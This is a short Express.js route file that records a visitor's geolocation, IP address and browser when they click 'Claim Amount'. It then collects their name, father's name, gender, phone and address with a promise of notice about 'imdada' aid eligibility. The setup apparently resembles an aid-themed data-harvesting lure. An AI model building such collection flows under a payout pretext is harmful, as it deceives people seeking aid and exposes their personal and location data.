const express = require('express');
const router = express.Router();
const Location = require('../models/Locations');
const Information = require('../models/informations_model');

// Save user location when they click Claim Amount
router.post('/api/save-location', async (req, res) => {
    try {
        const { latitude, longitude } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({
                success: false,
                message: 'Latitude and longitude are required'
            });
        }

        const locationData = {
            latitude: parseFloat(latitude),
            longitude: parseFloat(longitude),
            ipAddress: req.ip || req.connection.remoteAddress,
            userAgent: req.get('user-agent')
        };

        const location = await Location.create(locationData);

        res.json({
            success: true,
            message: 'Location saved successfully',
            locationId: location._id,
            location: {
                latitude: location.latitude,
                longitude: location.longitude
            }
        });
    } catch (error) {
        console.error('Error saving location:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving location',
            error: error.message
        });
    }
});

// Submit user information form
router.post('/api/submit-information', async (req, res) => {
    try {
        const { name, father, gender, phoneNumber, address, latitude, longitude } = req.body;

        // Validation
        if (!name || !father || !gender || !phoneNumber || !address) {
            return res.status(400).json({
                success: false,
                message: 'All fields are required'
            });
        }

        const informationData = {
            name: name.trim(),
            father: father.trim(),
            gender: gender,
            phoneNumber: phoneNumber.trim(),
            address: address.trim(),
            location: {
                latitude: latitude ? parseFloat(latitude) : null,
                longitude: longitude ? parseFloat(longitude) : null
            }
        };

        const information = await Information.create(informationData);

        res.json({
            success: true,
            message: 'Thanks for filling form. We will inform you on your number after 20 min, you are eligible for imdada or not',
            data: {
                id: information._id,
                name: information.name,
                phoneNumber: information.phoneNumber
            }
        });
    } catch (error) {
        console.error('Error submitting information:', error);
        res.status(500).json({
            success: false,
            message: 'Error submitting information',
            error: error.message
        });
    }
});

module.exports = router;

